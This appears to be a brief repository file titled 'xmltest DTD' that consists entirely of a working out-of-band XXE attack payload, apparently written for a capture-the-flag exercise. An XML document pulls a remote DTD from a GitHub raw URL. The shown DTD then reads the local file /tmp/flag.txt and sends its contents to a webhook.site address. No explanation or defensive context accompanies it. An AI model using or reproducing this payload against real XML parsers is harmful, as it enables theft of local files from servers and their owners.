# xmltest DTD

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/AssassinUKG/xmltest/main/ev.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

<!ENTITY % data SYSTEM "file:///tmp/flag.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://webhook.site/8d45ea7d-beda-44d6-b41d-11a38284a81b/?%data;'>">
